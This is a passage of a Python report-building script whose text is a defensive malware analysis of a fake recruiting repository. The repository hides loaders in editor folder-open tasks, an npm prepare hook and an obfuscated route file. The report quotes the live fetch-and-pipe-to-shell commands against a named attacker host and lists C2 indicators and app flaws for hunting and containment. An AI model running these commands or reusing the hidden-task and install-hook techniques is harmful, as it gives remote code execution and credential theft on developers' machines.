    story.append(bullet("Ports disagree with each other. The README says port 3000, which is the React dev server. The client proxy points at port 5001. <font face='Consolas' size='9'>config.js</font> defaults the API to 7777, and <font face='Consolas' size='9'>server.js</font> falls through to 3030 only if that value is missing. The pieces were not run together as one product."))
    story.append(bullet("The client API helper posts to <font face='Consolas' size='9'>/get_profile</font>, <font face='Consolas' size='9'>/get_poker_tables</font>, and <font face='Consolas' size='9'>/get_game_by_id</font>. The Express app mounts <font face='Consolas' size='9'>/api/auth</font>, <font face='Consolas' size='9'>/api/users</font>, and <font face='Consolas' size='9'>/api/chips</font>. The two halves do not share a contract."))
    story.append(
        P(
            "<font face='Consolas' size='9'>.gitignore</font> ignores <font face='Consolas' size='9'>.git</font> itself, plus a Microsoft Office lock file whose name is a German Wi-Fi presentation, and an Excel workbook under <font face='Consolas' size='9'>loca/</font>. "
            "Those entries are packaging leftovers. They support a conclusion that this tree was assembled from older material and then given a new README and the loaders. They are not an attribution."
        )
    )

    story += section("chain", "4.  How the malware is supposed to run")
    story.append(
        P(
            "The package does not need a victim to open a special file or to click a document macro. It uses two habits of software work: opening a repository in an editor, and installing its dependencies. Either habit is enough. Doing both starts both loaders."
        )
    )
    story.append(fig(charts["triggers"]))
    story.append(
        caption(
            "Figure 2. Actions a developer would take, and whether the code in this tree would then reach attacker infrastructure. "
            "“Yes” means the local source would perform that step. It does not mean the step was observed during this review. "
            "The remote shell and the remote JavaScript were not retrieved."
        )
    )
    story.append(P("Path A — editor tasks on folder open", "h2"))
    story.append(
        P(
            "<font face='Consolas' size='9'>.vscode/tasks.json</font> defines two tasks, both with <font face='Consolas' size='9'>runOn</font> set to <font face='Consolas' size='9'>folderOpen</font>, and both with presentation set so the terminal does not take focus, does not echo the command, and does not leave a reuse message. "
            "The shell task also sets <font face='Consolas' size='9'>close: true</font>."
        )
    )
    story.append(bullet("<b>version-update</b> runs <font face='Consolas' size='9'>npm install --silent --no-progress</font> with the workspace as the working directory. On Windows the shell is <font face='Consolas' size='9'>cmd.exe /c</font>. On macOS and Linux it is a login bash. A silent install is what causes Path B to run as a side effect, because install runs <font face='Consolas' size='9'>prepare</font>."))
    story.append(bullet("<b>env</b> is a different command per operating system, padded with a long run of spaces so the command sits far to the right of the visible line in a normal editor viewport. Windows uses <font face='Consolas' size='9'>curl --ssl-no-revoke</font> and pipes the body into <font face='Consolas' size='9'>cmd</font>. The flag turns off certificate-revocation checking. macOS pipes <font face='Consolas' size='9'>curl</font> into <font face='Consolas' size='9'>bash</font>. Linux pipes <font face='Consolas' size='9'>wget -qO-</font> into <font face='Consolas' size='9'>sh</font>."))
    story.append(
        P(
            "The three URLs differ only by the last path segment: <font face='Consolas' size='9'>/api/settings/windows</font>, <font face='Consolas' size='9'>/api/settings/mac</font>, and <font face='Consolas' size='9'>/api/settings/linux</font>, all on <font face='Consolas' size='9'>api-checking-1.vercel.app</font>. "
            "Piping a downloaded body into a shell means the publisher of that URL chooses the commands. Nothing in the repository constrains them. Persistence, credential theft, or a second implant would live in that response, not in git."
        )
    )
    story.append(
        P(
            "<font face='Consolas' size='9'>.vscode/settings.json</font> was reviewed separately. It sets ordinary editor preferences and terminal profiles, including a non-standard <font face='Consolas' size='9'>terminal.integrated.defaultProfileCondition</font> block that does not launch a downloader. The malicious editor content is in <font face='Consolas' size='9'>tasks.json</font>."
        )
    )
    story.append(P("Path B — install, then the hidden loader", "h2"))
    story.append(
        P(
            "The root manifest is the one npm reads for the repository. Its <font face='Consolas' size='9'>prepare</font> script is:"
        )
    )
    story.append(code_block('start /b node server || nohup node server &'))
    story.append(Spacer(1, 6))
    story.append(
        P(
            "<font face='Consolas' size='9'>prepare</font> runs on a normal install, including the silent install from the editor task. "
            "<font face='Consolas' size='9'>start /b</font> is a Windows command that launches a process without a new window. <font face='Consolas' size='9'>nohup … &amp;</font> is the Unix equivalent, chained with <font face='Consolas' size='9'>||</font> so one of the two forms is attempted. "
            "The client package has no lifecycle script of its own. The hook is only at the root, which is the directory a person installs when they follow the README."
        )
    )
    story.append(
        P(
            "<font face='Consolas' size='9'>server.js</font> loads middleware and then calls <font face='Consolas' size='9'>configureRoutes</font>. "
            "The route index mounts <font face='Consolas' size='9'>/api/auth</font> with a <font face='Consolas' size='9'>require</font> of <font face='Consolas' size='9'>routes/api/auth.js</font>. "
            "That require executes the file from top to bottom. The hidden program is not inside the login handler. It runs at import time, before the process binds a port, and it does not need a user to visit the site."
        )
    )
    story.append(P("What the decoded loader does", "h2"))
    story.append(
        P(
            "The tail of <font face='Consolas' size='9'>routes/api/auth.js</font> is one physical line. After <font face='Consolas' size='9'>module.exports = router;</font> there is a long gap of spaces, then a compact program. "
            "It recovers the names <font face='Consolas' size='9'>Buffer</font> and <font face='Consolas' size='9'>Function</font> from character codes, XOR-decodes a hex blob with a short key, and invokes the result as a function whose argument is Node’s <font face='Consolas' size='9'>require</font>. "
            "The spacing is there so a glance at the end of the route file shows a normal export."
        )
    )
    story.append(bullet("It replaces <font face='Consolas' size='9'>console.log</font>, <font face='Consolas' size='9'>info</font>, <font face='Consolas' size='9'>warn</font>, <font face='Consolas' size='9'>error</font>, <font face='Consolas' size='9'>debug</font>, and <font face='Consolas' size='9'>trace</font> with empty functions, and it replaces <font face='Consolas' size='9'>stdout.write</font> and <font face='Consolas' size='9'>stderr.write</font> the same way. Later errors from the loader, and a large amount of ordinary server logging, disappear."))
    story.append(bullet("It sets <font face='Consolas' size='9'>process.env.AHA_SERVER</font> to <font face='Consolas' size='9'>http://88.216.57.122:8080</font> and <font face='Consolas' size='9'>process.env.AHA_TEAM</font> to <font face='Consolas' size='9'>6cd9a1e17f045d11ec4e0b102bc04f9d</font>. Those names are a campaign marker. The team value is an identifier the second stage can send home so the operator knows which lure succeeded."))
    story.append(bullet("It requests <font face='Consolas' size='9'>/api/runners/start/javascript</font> on that host, with a 15-second abort, and expects a plain-text body. On any failure it waits three seconds and tries again. The loop does not end until a body has been received and evaluated without throwing."))
    story.append(bullet("The body is passed to <font face='Consolas' size='9'>eval</font>. If the result is a promise, the loader waits for it. From that point the process has whatever authority the Node process has: the user who launched it, their files, and their network."))
    story.append(
        P(
            "The fetch uses cleartext HTTP. On a hostile network the response can be substituted by anyone who can see the traffic. The operator already controls the host, so the lack of TLS is a reliability choice, not a limit on the operator."
        )
    )
    story.append(
        callout(
            "<b>Why this matches a fake job offer.</b> Recruiting lures in Web3 and DeFi work ask the candidate to clone a repository and run it locally, often framed as a paid audit or a take-home. "
            "A README that overclaims a blockchain product, a familiar poker codebase underneath, a few obvious security bugs to “find,” and a hidden install-time loader are the same shape. "
            "The bugs give the task a plot. The tasks file and the prepare script are the point of handing the repository over."
        )
    )

    story += section("catalog", "5.  Finding catalog")
    story.append(
        P(
            "Eleven findings are recorded. Three are the malware. One is the lure that makes the malware plausible. Seven are defects in the poker application. "
            "Severity here is about the copy as it sits on disk, for a person who was asked to open it. A game bug that only matters after the server is running is still rated on its own effect, and it is also a reason the server would be started."
        )
    )
    story.append(fig(charts["severity"]))
    story.append(
        caption(
            "Figure 3. Count of findings at each severity. Critical is reserved for code whose purpose is to run an outside program. "
            "High covers the lure and the flaws that defeat authentication or game integrity. Medium covers weaker configuration and relay issues. Low is a broken feature that does not, by itself, hand over the machine."
        )
    )
    story.append(fig(charts["category"]))
    story.append(
        caption(
            "Figure 4. The same eleven findings grouped by the kind of failure. Malware execution is a third of the set and, in Figure 5, almost all of the risk."
        )
    )
    story.append(fig(charts["scores"]))
    story.append(
        caption(
            "Figure 5. Relative contribution to risk, scored by the rubric in the appendix. "
            "F-01 and F-02 are tied at the top because each can compromise the host without the other. F-03 is the install hook that makes F-02 run during setup, and it is also what the silent editor task invokes."
        )
    )

    story.append(P("Catalog", "h2"))
    story.append(
        data_table(
            ["ID", "Severity", "Area", "Finding"],
            [
                ["F-01", "Critical", "Editor", "Folder-open task downloads a script and pipes it into a shell. A second task silently installs dependencies."],
                ["F-02", "Critical", "Server", "routes/api/auth.js hides a loader that evaluates JavaScript from 88.216.57.122."],
                ["F-03", "Critical", "Supply chain", "The npm prepare script starts the server in the background on install."],
                ["F-04", "High", "Auth", "Login treats every existing account as authenticated and never compares the password."],
                ["F-05", "High", "Sockets", "Lobby identity is a wallet address and username taken from the client, with no signature."],
                ["F-06", "High", "Game", "Rebuy and raise amounts are applied without an ownership check or a lower bound."],
                ["F-07", "Medium", "Secrets", "JWT secret and lifetime are misconfigured, and the raw token is written to the console."],
                ["F-08", "Medium", "Hardening", "CORS allows any origin. Helmet is present only as a comment."],
                ["F-09", "Medium", "Relay", "Lobby and table chat are broadcast with the sender’s text unchanged."],
                ["F-10", "Low", "Reliability", "The Mongo connector is never called, and dotenv reads a path that is not in the tree."],
                ["F-11", "High", "Lure", "The README describes a company and a protocol that this tree does not implement, and its setup runs the loader."],
            ],
            [0.55 * inch, 0.75 * inch, 0.95 * inch, 4.9 * inch],
        )
    )
    story.append(Spacer(1, 8))

    story += section("malware", "6.  Malware findings in detail")

    story.extend(finding("F-01  ·  Critical  ·  Remote command on folder open"))
    story.append(P("<b>Location.</b> <font face='Consolas' size='9'>.vscode/tasks.json</font>, tasks <font face='Consolas' size='9'>version-update</font> and <font face='Consolas' size='9'>env</font>.", "body_left"))
    story.append(
        P(
            "Visual Studio Code, and editors that share its task runner, can run a task when a folder is opened. This file opts both tasks into that behavior and then hides the terminal. "
            "The install task is harmful because of F-03: a silent <font face='Consolas' size='9'>npm install</font> executes <font face='Consolas' size='9'>prepare</font>, which starts the Node loader. "
            "The env task is harmful on its own. It does not vendor a payload. It fetches one, per operating system, and hands the bytes to a shell."
        )
    )
    story.append(P("Indicators, quoted so they can be hunted. These lines are the malicious commands. They should not be run.", "small"))
    story.append(
        code_block(
            "npm install --silent --no-progress\n"
            "curl --ssl-no-revoke -L https://api-checking-1.vercel.app/api/settings/windows | cmd\n"
            "curl -L 'https://api-checking-1.vercel.app/api/settings/mac' | bash\n"
            "wget -qO- 'https://api-checking-1.vercel.app/api/settings/linux' | sh"
        )
    )
    story.append(Spacer(1, 6))
    story.append(
        P(
            "The Windows command disables revocation checks, so a later problem with the certificate on that host would not stop curl. "
            "The long runs of spaces before each <font face='Consolas' size='9'>command</font> key are a layout trick: in an editor that does not wrap, the dangerous string is off-screen to the right of a short-looking line. "
            "Current editors still ask before running folder-open tasks when automatic tasks are disabled. The file is written for the case where that prompt is accepted, or where a policy has turned automatic tasks on."
        )
    )
    story.append(
        P(
            "<b>Impact.</b> The shell runs as the user who opened the folder. A script in that position can read developer credentials, browser profiles, SSH keys, cloud tokens, and cryptocurrency wallet files, and it can install anything that user can install. "
            "The contents of the three URLs were not collected in this review, so the specific second stage for Path A is unconfirmed. The local behavior — download and pipe to a shell, silently — is enough to treat approval of the task as a compromise."
        )
    )

    story.extend(finding("F-02  ·  Critical  ·  Obfuscated loader in the auth route"))
    story.append(P("<b>Location.</b> <font face='Consolas' size='9'>routes/api/auth.js</font>, the same line as <font face='Consolas' size='9'>module.exports = router;</font>.", "body_left"))
    story.append(
        P(
            "The visible half of the file is a normal Express router: GET the current user, POST a login. The hidden half runs as soon as Node evaluates the module. "
            "Obfuscation is shallow and deliberate. Names are built with <font face='Consolas' size='9'>String.fromCharCode</font> so a search for the word <font face='Consolas' size='9'>Buffer</font> or <font face='Consolas' size='9'>Function</font> misses the call. The program itself is XOR-encoded so a search for the IP address also misses, until the blob is decoded."
        )
    )
    story.append(
        P(
            "Decoded behavior is described in section 4. The operational facts worth restating as a finding are these. "
            "The loader is not conditional on an environment variable, a debug flag, or an admin route. Any import of the auth router starts it. "
            "The server’s own route table imports that router during startup, so <font face='Consolas' size='9'>node server</font>, <font face='Consolas' size='9'>npm run dev</font>, <font face='Consolas' size='9'>npm run start:backend</font>, and the prepare script are all sufficient. "
            "The retry loop keeps the process calling the host until a script evaluates. Silencing stdout means the poker server can appear to be “just running” while the loader is active in the same process."
        )
    )
    story.append(
        P(
            "<b>Impact.</b> Remote code execution as the user who started Node, with a live channel for the operator to change the payload without changing the repository. "
            "Cleartext HTTP means the payload is also exposed to anyone on the path, which matters if a compromised developer later runs this on a shared network: the operator is not the only party who could answer that request. "
            "The team identifier lets a campaign sort victims. Seeing <font face='Consolas' size='9'>AHA_SERVER</font> or <font face='Consolas' size='9'>AHA_TEAM</font> in a process environment, or a Node process holding a connection to <font face='Consolas' size='9'>88.216.57.122</font> on port 8080, is a high-confidence sign that this loader has run."
        )
    )

    story.extend(finding("F-03  ·  Critical  ·  Install hook that starts the loader"))
    story.append(P("<b>Location.</b> root <font face='Consolas' size='9'>package.json</font>, script <font face='Consolas' size='9'>prepare</font>.", "body_left"))
    story.append(
        P(
            "npm runs <font face='Consolas' size='9'>prepare</font> after <font face='Consolas' size='9'>npm install</font> and after <font face='Consolas' size='9'>npm ci</font>, including installs started by another tool. "
            "The script’s only job is to launch the server and return. On Windows, <font face='Consolas' size='9'>start /b</font> detaches it from the install console. A person watching the install can see a normal dependency install and a prompt returned, while <font face='Consolas' size='9'>node server</font> continues."
        )
    )
    story.append(
        P(
            "The script is also malformed as a portable command, which is useful evidence of intent rather than a mistake in a build step. "
            "A genuine prepare script in this project would compile TypeScript, install the client, or print a post-install note. This one starts the network-facing process that contains the loader, and it offers both a Windows form and a Unix form so the same manifest works on the machines a recruiting pool would use. "
            "There is no test, build, or generation step attached to it."
        )
    )
    story.append(
        P(
            "<b>Coupling.</b> F-01’s install task, the README quick start, and a developer’s own habit all converge on this one line. Removing the shell task and leaving <font face='Consolas' size='9'>prepare</font> in place would still compromise anyone who installs. Removing <font face='Consolas' size='9'>prepare</font> and leaving the shell task would still compromise anyone who allows automatic tasks. Both have to be treated as live."
        )
    )
    story.append(
        P(
            "<b>Impact.</b> Supply-chain execution inside a repository the victim cloned on purpose. No typo-squatted package name is required. The malicious code is in the project the victim was sent, which is why a registry audit alone would not have caught it. "
            "This working copy has no <font face='Consolas' size='9'>node_modules</font>, which is the expected residue of a completed install. That is the best local sign that F-03 has not completed here."
        )
    )

    story.extend(finding("F-11  ·  High  ·  The README is the pretext"))
    story.append(P("<b>Location.</b> <font face='Consolas' size='9'>README.md</font>.", "body_left"))
    story.append(
        P(
            "F-11 is not a software defect in the poker code. It is the document that tells a reader what they are looking at, and it is false in the ways that matter. "
            "It names a protocol, a chain, a team, and a stack that are not in the tree, and it instructs the reader to install and start the project. "
            "Section 3 and Figure 1 record the gap technology by technology. The security relevance is the instruction, not the adjectives: the advertised “quick start” is the trigger for F-03."
        )
    )
    story.append(
        P(
            "Fake hiring pipelines in this space send a repository, ask for a short written audit or a bug list, and use the time the candidate spends installing the project. "
            "A poker server with an obvious login bypass is a credible audit task. A metaverse README on top of that server is the industry costume. Together they explain why the loaders are placed where a careful reviewer still executes them before the review is finished: the bugs are in the running app, so the app gets run."
        )
    )

    story += section("heatmap", "7.  Where the exposure sits")
    story.append(
        P(
            "The heatmap scores each important component on five questions, from 0 (no meaningful exposure) to 5 (the component is built to produce that outcome). "
            "Code execution means an outside program can run. Credential or wallet exposure means the component is a practical path to secrets or to a session that can spend funds. "
            "Integrity means game or account state can be changed against the rules. Stealth means a normal run hides what happened. Ease of trigger means a routine developer action is enough."
        )
    )
    story.append(fig(charts["heatmap"]))
    story.append(
        caption(
            "Figure 6. Exposure by component. The three malware components score 5 on code execution. "
            "The README scores 5 on stealth and ease because it looks like product documentation and because its setup command is the install hook. "
            "Game logic scores 5 on integrity and 0 on code execution: it can corrupt a table, and it cannot, by itself, run a program."
        )
    )
    story.append(
        P(
            "The pattern in the figure is the point of the package. Execution risk is concentrated in three files a dependency install and an editor will touch without a code review. "
            "Integrity risk is concentrated in the poker rules a candidate would be praised for finding. A review that stops at the login bypass has done what the lure asked, and has already passed the moment of compromise if the project was installed in order to test that bypass."
        )
    )

    story += section("weak", "8.  Application weaknesses")
    story.append(
        P(
            "The findings in this section are properties of the poker server. They are included because they are real, because several look planted as an audit exercise, and because describing the repository honestly means describing them. "
            "They are not instructions for abusing a table. If the server is running, F-02 has already run in that same process, and the host is the urgent problem."
        )
    )
    story.append(fig(charts["controls"]))
    story.append(
        caption(
            "Figure 7. Controls that are actually wired, next to controls that are missing. "
            "Registration hashes passwords, HTTP routes can require a JWT, and a handful of Express middleware packages are enabled. "
            "The checks that would make login, sockets, and chips meaningful are the ones left out. The middleware that is present makes a quick look at the stack feel like a secured API."
        )
    )

    story.extend(finding("F-04  ·  High  ·  Login does not check the password"))
    story.append(P("<b>Location.</b> <font face='Consolas' size='9'>controllers/auth.js</font>, function <font face='Consolas' size='9'>login</font>.", "body_left"))
    story.append(
        P(
            "The handler validates that the body contains an email and a password. It loads a user by email. It then sets the match flag to the constant <font face='Consolas' size='9'>true</font> and logs that constant. "
            "The branch that would reject a bad password is unreachable. <font face='Consolas' size='9'>bcrypt</font> is imported in this file and is not used. Registration, in <font face='Consolas' size='9'>controllers/users.js</font>, does hash passwords with bcrypt, so stored hashes are not plaintext. They are also irrelevant at login."
        )
    )
    story.append(
        P(
            "<b>Impact.</b> Anyone who can reach the API and who knows an email address that has a row can obtain a JWT for that account. The password field is accepted and ignored. "
            "Unknown emails receive the same “Invalid credentials” message the dead branch would have sent, so the successful path is “this email exists.” "
            "A second defect sits beside this one: both login and registration pass <font face='Consolas' size='9'>config.JWT_TOKEN_EXPIRES_IN</font>, and <font face='Consolas' size='9'>config.js</font> never defines that field. Token lifetime is not configured. Combined with F-10, a database that is never connected, this bypass matters on a server that someone has finished wiring. As planted, it is still an intentional removal of the check."
        )
    )

    story.extend(finding("F-05  ·  High  ·  Sockets trust the client for identity"))
    story.append(P("<b>Location.</b> <font face='Consolas' size='9'>socket/index.js</font> and <font face='Consolas' size='9'>client/src/pages/ConnectWallet/ConnectWallet.js</font>.", "body_left"))
    story.append(
        P(
            "The HTTP API can demand a JWT. The socket gateway never reads one. On <font face='Consolas' size='9'>CS_LOBBY_CONNECT</font> and <font face='Consolas' size='9'>CS_FETCH_LOBBY_INFO</font> the server accepts <font face='Consolas' size='9'>walletAddress</font>, <font face='Consolas' size='9'>username</font>, and <font face='Consolas' size='9'>gameId</font> from the event payload and stores a player under them. "
            "The connect page reads those three values from the URL query string and emits them once the socket is up. There is no signature over the address, no binding to <font face='Consolas' size='9'>eth_requestAccounts</font>, and no check that the socket id in the payload is the socket that sent it."
        )
    )
    story.append(
        P(
            "<b>Impact.</b> Presence at a table is a claim, not a proof. A client can announce any address and any display name. "
            "That is enough to sit in a game as another person and to aim the chip bugs in F-06. It is not, in this code, a transaction against a chain. "
            "<font face='Consolas' size='9'>client/src/utils/interact.js</font> can request accounts and call <font face='Consolas' size='9'>wallet_switchEthereumChain</font> with <font face='Consolas' size='9'>REACT_APP_CHAIN_ID</font>. No <font face='Consolas' size='9'>eth_sign</font>, permit, or approval call is present. The drainer, if the operator has one, is in the remote stage rather than in this page."
        )
    )

    story.extend(finding("F-06  ·  High  ·  Chip movements are not authorized"))
    story.append(P("<b>Location.</b> <font face='Consolas' size='9'>socket/index.js</font> (<font face='Consolas' size='9'>CS_REBUY</font>, <font face='Consolas' size='9'>CS_RAISE</font>), <font face='Consolas' size='9'>game/Table.js</font> (<font face='Consolas' size='9'>rebuyPlayer</font>, <font face='Consolas' size='9'>handleRaise</font>), and <font face='Consolas' size='9'>game/Seat.js</font> (<font face='Consolas' size='9'>raise</font>).", "body_left"))
    story.append(
        P(
            "Joining a table does call an internal sit-down with the table limit and the current player count, so that particular path chooses the amount on the server. "
            "Rebuy is different. The socket event takes <font face='Consolas' size='9'>tableId</font>, <font face='Consolas' size='9'>seatId</font>, and <font face='Consolas' size='9'>amount</font> from the client. <font face='Consolas' size='9'>rebuyPlayer</font> adds <font face='Consolas' size='9'>amount</font> to that seat’s stack. The handler does not check that the seat belongs to the socket, and it does not require the amount to be positive or within a bankroll."
        )
    )
    story.append(
        P(
            "Raises have a one-sided guard. <font face='Consolas' size='9'>Seat.raise</font> computes the difference between the requested amount and the current bet, and it returns early only when that difference is greater than the stack. "
            "A requested amount below the current bet produces a negative difference, which the guard allows. The stack is then adjusted by that difference, and the pot is adjusted by the same kind of delta, which was captured before the seat update. "
            "The effect is that chips can move from the pot back to a stack, and a rebuy can name someone else’s seat. Folds, checks, and calls are at least bound to the socket id through <font face='Consolas' size='9'>findPlayerBySocketId</font>. Rebuy and the size of a raise are not bound to a credible economy."
        )
    )
    story.append(
        P(
            "<b>Impact.</b> Any connected client can distort stacks and the pot. In a play-money demo that is a broken game. In anything that later settled those stacks on a chain, it would be theft of the pot. Nothing in this tree settles a hand on a chain. The finding stands as an integrity failure and as the sort of bug a take-home write-up would be expected to name."
        )
    )

    story.extend(finding("F-07  ·  Medium  ·  JWT configuration and token logging"))
    story.append(P("<b>Location.</b> <font face='Consolas' size='9'>config.js</font>, <font face='Consolas' size='9'>middleware/auth.js</font>, <font face='Consolas' size='9'>controllers/auth.js</font>, <font face='Consolas' size='9'>controllers/users.js</font>.", "body_left"))
    story.append(
        P(
            "<font face='Consolas' size='9'>JWT_SECRET</font> is <font face='Consolas' size='9'>process.env.JWT_SECRET</font> with no generated fallback, and the dotenv load points at <font face='Consolas' size='9'>./server/config/local.env</font>. That path is not in the tree. The config module that does exist is <font face='Consolas' size='9'>config.js</font> at the repository root, next to a <font face='Consolas' size='9'>config/</font> directory that only contains <font face='Consolas' size='9'>db.js</font>. "
            "If the variable is unset, tokens are signed and checked with an empty secret, which means anyone who knows the server is using an empty secret can forge a token. "
            "The auth middleware prints the raw <font face='Consolas' size='9'>x-auth-token</font> header on every authenticated request. Combined with F-02, which disables console output after import, those prints may never appear — the loader’s first act is to throw logging away. The write is still in the source, and it would matter in any copy of this middleware that is imported without the loader."
        )
    )

    story.extend(finding("F-08  ·  Medium  ·  Browser-facing hardening is incomplete"))
    story.append(P("<b>Location.</b> <font face='Consolas' size='9'>middleware/index.js</font>.", "body_left"))
    story.append(
        P(
            "The middleware stack enables JSON parsing, cookie parsing, <font face='Consolas' size='9'>express-mongo-sanitize</font>, <font face='Consolas' size='9'>xss-clean</font>, <font face='Consolas' size='9'>hpp</font>, and a rate limit of 100 requests per 10 minutes. "
            "Helmet is imported only inside a comment, so the API does not set the header set Helmet would have added. <font face='Consolas' size='9'>cors()</font> is called with no origin list, which reflects a permissive cross-origin policy. "
            "Those are ordinary hardening gaps. They become more useful to an attacker only after the process is already running, which is the same moment F-02 has started."
        )
    )

    story.extend(finding("F-09  ·  Medium  ·  Chat is an open relay"))
    story.append(P("<b>Location.</b> <font face='Consolas' size='9'>socket/index.js</font>, events <font face='Consolas' size='9'>CS_LOBBY_CHAT</font> and <font face='Consolas' size='9'>TABLE_MESSAGE</font>.", "body_left"))
    story.append(
        P(
            "Lobby chat emits the supplied text and user info to the room. Table messages are broadcast with the supplied message and the supplied “from” field. "
            "There is no membership test beyond “this socket sent an event,” no length limit in the handler, and no separation between a system message and a player message. "
            "Other players’ clients render what the server forwards. That is a stored-or-reflected content problem for anyone sitting at the table, and a way to paste a link or a prompt into a game session. It is not the host compromise."
        )
    )

    story.extend(finding("F-10  ·  Low  ·  The data layer is not connected"))
    story.append(P("<b>Location.</b> <font face='Consolas' size='9'>server.js</font>, <font face='Consolas' size='9'>config/db.js</font>, <font face='Consolas' size='9'>config.js</font>.", "body_left"))
    story.append(
        P(
            "<font face='Consolas' size='9'>connectDB</font> is exported and never required by the entrypoint. User registration, login, and the free-chip route all assume Mongoose is connected. "
            "On an unmodified start they cannot succeed, because there is no connection and no <font face='Consolas' size='9'>MONGO_URI</font>. "
            "The game itself keeps tables and players in memory inside <font face='Consolas' size='9'>socket/index.js</font>, so a socket session does not need Mongo. "
            "This is the strongest structural sign that the HTTP API is scenery around the socket game and the loader: the feature the README would call an account system cannot run, and the process still reaches the network for the operator."
        )
    )

    story.append(P("Other observations that did not become findings", "h2"))
    story.append(bullet("<font face='Consolas' size='9'>routes/api/auth.js</font> imports <font face='Consolas' size='9'>setApiKey</font> and <font face='Consolas' size='9'>verify</font> from the controller. The controller does not export them. The import is unused. It shows the route file was edited after the controller was written."))
    story.append(bullet("<font face='Consolas' size='9'>controllers/auth.js</font> imports <font face='Consolas' size='9'>axios</font> and does not call it. No server-side request to a wallet API or a webhook is hiding in that import."))
    story.append(bullet("Hole cards are stripped in <font face='Consolas' size='9'>hideOpponentCards</font> before a table snapshot is sent to a given socket, except at showdown for a winner. That control is real and is counted in Figure 7."))
    story.append(bullet("<font face='Consolas' size='9'>CS_JOIN_TABLE</font> uses the table object before checking that the id exists. A bad id throws in the handler. That is a robustness bug, not an exposure, and it is not given an ID."))
    story.append(bullet("No <font face='Consolas' size='9'>.env</font> file with live secrets was in the tree. The risk is the loader and the tasks, not a committed key."))

    story += section("ioc", "9.  Indicators and what was not collected")
    story.append(
        P(
            "The following values are on disk in this tree or were recovered by decoding the local blob. They are suitable for block lists, proxy denies, and endpoint hunts. "
            "They are not links to follow. Retrieving the two remote resources would execute nothing by itself only if the client refused to run the body; the safe action is to block them and search for them, not to open them."
        )
    )
    story.append(
        data_table(
            ["Indicator", "Where it appears", "Role"],
            [
                ["api-checking-1.vercel.app", "tasks.json, env task", "Host of the per-OS shell script"],
                ["/api/settings/windows", "tasks.json", "Body piped to cmd. curl is passed --ssl-no-revoke"],
                ["/api/settings/mac", "tasks.json", "Body piped to bash"],
                ["/api/settings/linux", "tasks.json", "Body piped to sh via wget -qO-"],
                ["88.216.57.122", "decoded auth.js loader", "Command-and-control address"],
                ["TCP 8080, cleartext HTTP", "decoded loader", "Port of the JavaScript stage"],
                ["/api/runners/start/javascript", "decoded loader", "Path that is evaluated"],
                ["AHA_SERVER", "process env, set by loader", "Copy of the C2 base URL"],
                ["AHA_TEAM = 6cd9a1e17f045d11ec4e0b102bc04f9d", "process env, set by loader", "Campaign or victim-group id"],
                ["prepare → node server", "package.json", "Install-time start of the loader"],
                ["runOn: folderOpen", "both tasks", "Editor trigger"],
            ],
            [2.35 * inch, 1.9 * inch, 2.9 * inch],
        )
    )
    story.append(Spacer(1, 8))
    story.append(P("Hunts on a machine that may already have run it", "h2"))
    story.append(bullet("DNS, proxy, and firewall logs for <font face='Consolas' size='9'>api-checking-1.vercel.app</font> and for <font face='Consolas' size='9'>88.216.57.122</font>."))
    story.append(bullet("Process lists and shell history for <font face='Consolas' size='9'>node server</font> or <font face='Consolas' size='9'>node ./server</font> started from this directory, including a process whose parent was <font face='Consolas' size='9'>npm install</font>."))
    story.append(bullet("A Node process environment containing <font face='Consolas' size='9'>AHA_SERVER</font> or <font face='Consolas' size='9'>AHA_TEAM</font>."))
    story.append(bullet("Editor logs or the user setting <font face='Consolas' size='9'>task.allowAutomaticTasks</font>, and any terminal scrollback from a task named <font face='Consolas' size='9'>env</font> or <font face='Consolas' size='9'>version-update</font>."))
    story.append(bullet("Outbound HTTP to port 8080 that requests a path beginning with <font face='Consolas' size='9'>/api/runners/</font>."))
    story.append(
        P(
            "If any of those are present, the follow-up belongs to incident response on a clean machine: rotate passwords, personal access tokens, cloud keys, SSH keys, and wallet keys that existed on the exposed host; revoke sessions; and review browser-wallet extensions. "
            "Changing a password from the same host, after a loader has evaluated remote code, does not recover the account. This report does not attempt to name the second stage’s files, because that sample was not retrieved."
        )
    )
    story.append(P("What this review deliberately does not contain", "h2"))
    story.append(bullet("The decoded source of the loader, the XOR key, and the ciphertext. The behavior is described above. The blob does not need to be republished to recognize the file: it is the long line at the end of <font face='Consolas' size='9'>routes/api/auth.js</font>."))
    story.append(bullet("The body served by the Vercel paths, and the body served by <font face='Consolas' size='9'>/api/runners/start/javascript</font>."))
    story.append(bullet("A working sequence for the raise and rebuy flaws. The direction of the bug is stated so it can be fixed or discarded with the rest of the tree."))

    story += section("response", "10.  Containment and handling")
    story.append(P("If the folder was only downloaded and read", "h2"))
    story.append(
        P(
            "Reading the files, including the work done for this report, does not start either loader. Leave automatic tasks disabled. Do not run <font face='Consolas' size='9'>npm install</font>, <font face='Consolas' size='9'>npm ci</font>, <font face='Consolas' size='9'>npm start</font>, <font face='Consolas' size='9'>npm run dev</font>, or either task by hand. "
            "Deleting the folder is appropriate once any notes you need have been copied out. Empty the recycle bin afterward. A copy sitting in Downloads is still one accidental install away from the loader."
        )
    )
    story.append(P("If install ran, or automatic tasks were allowed", "h2"))
    story.append(bullet("Disconnect the host from the network before doing anything that sends a password or a session cookie."))
    story.append(bullet("From a different device, rotate credentials that were present on the host: email, Git hosting, cloud consoles, npm, exchange accounts, and any wallet whose keys or extension state lived on that machine. Assume session tokens are copied."))
    story.append(bullet("Preserve the machine if the loss matters. Disk image first, then look for the indicators in section 9. Reinstalling immediately is reasonable for a personal workstation once backups of irreplaceable files are made from a live environment that does not execute them."))
    story.append(bullet("Search other projects received from the same sender. This packaging — a metaverse README, a <font face='Consolas' size='9'>tasks.json</font> with <font face='Consolas' size='9'>runOn: folderOpen</font>, a <font face='Consolas' size='9'>prepare</font> script that starts a server, and a padded line in a route file — is a template. The next repository can carry the same three files with a different product name."))
    story.append(bullet("Tell the people who hold accounts you used on that host, where a shared secret or a shared workstation is involved. A single developer laptop often has production tokens."))
    story.append(P("What not to do with this tree", "h2"))
    story.append(bullet("Do not “detonate” it in a sandbox by running the tasks or the install to see the second stage, unless that sandbox is a disposable malware lab that cannot reach your real credentials and you are prepared to handle the sample. This assessment stopped before that step on purpose."))
    story.append(bullet("Do not open the Vercel URLs or the IP in a browser on a machine you care about. A browser will not pipe the body to a shell by itself; the risk is the habit of then saving and running what you see, and the risk of telling the host that the lure was opened."))
    story.append(bullet("Do not commit “cleaned” versions of these files back to a shared remote as a fix. The safe state of this project is deleted. There is no product here to salvage. The poker bugs are not worth a patch set on top of a backdoored tree."))
    story.append(P("If the only goal was the security exercise", "h2"))
    story.append(
